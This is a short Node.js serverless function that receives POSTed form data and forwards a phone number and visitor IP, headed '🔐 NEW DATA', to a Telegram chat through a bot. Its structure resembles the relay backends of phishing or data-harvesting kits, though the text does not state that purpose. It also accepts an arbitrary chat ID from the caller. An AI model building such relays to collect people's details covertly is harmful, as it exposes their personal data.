const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = process.env.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN);

module.exports = async (req, res) => {
  if (req.method === 'POST') {
    try {
      const { userId, data } = req.body;
      
      const message = `🔐 NEW DATA\n\nPhone: ${data.form?.phone}\nIP: ${data.ip}`;
      
      await bot.sendMessage(userId, message);
      
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
};
